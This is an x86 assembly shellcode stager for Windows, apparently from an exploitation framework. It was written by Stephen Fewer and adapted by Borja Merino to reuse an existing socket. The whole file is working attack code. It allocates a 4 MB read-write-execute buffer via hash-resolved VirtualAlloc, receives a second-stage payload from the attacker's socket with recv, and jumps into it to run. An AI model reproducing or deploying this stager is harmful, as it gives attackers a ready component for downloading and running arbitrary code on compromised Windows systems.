;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Author: Borja Merino  (modification to adapt it to OOB reuse technique)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (24 July 2009)
;-----------------------------------------------------------------------------;
[BITS 32]

; Compatible: block_bind_tcp, block_reverse_tcp, block_reverse_ipv6_tcp

; Input: EBP must be the address of 'api_call'. EDI must be the socket. ESI is a pointer on stack.
; Output: None.
; Clobbers: EAX, EBX, ESI, (ESP will also be modified)

allocate_memory:
  push byte 0x40         ; PAGE_EXECUTE_READWRITE
  push 0x1000            ; MEM_COMMIT
  push 0x00400000        ; Stage allocation (4Mb ought to do us)
  push 0x0               ; NULL as we dont care where the allocation is
  push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
  call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
  xchg ebx, eax
  push ebx               ; push the address of the new stage so we can return into it
read_more:               ;
  push byte 0            ; flags
  push 0x00400000        ; length
  push ebx               ; the current address into our second stage's RWX buffer
  push edi               ; the saved socket
  push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
  call ebp               ; recv( s, buffer, length, 0 );
  add ebx, eax           ; buffer += bytes_received
  test eax, eax          ; length -= bytes_received, will set flags
  jz jmp_stage           ; continue if we have more to read
  cmp eax,0xFFFFFFFF     ; Check to non-blocking socket (WSAEWOULDBLOCK) <-- Change me!
  jnz read_more
jmp_stage:
  ret                    ; return into the second stage
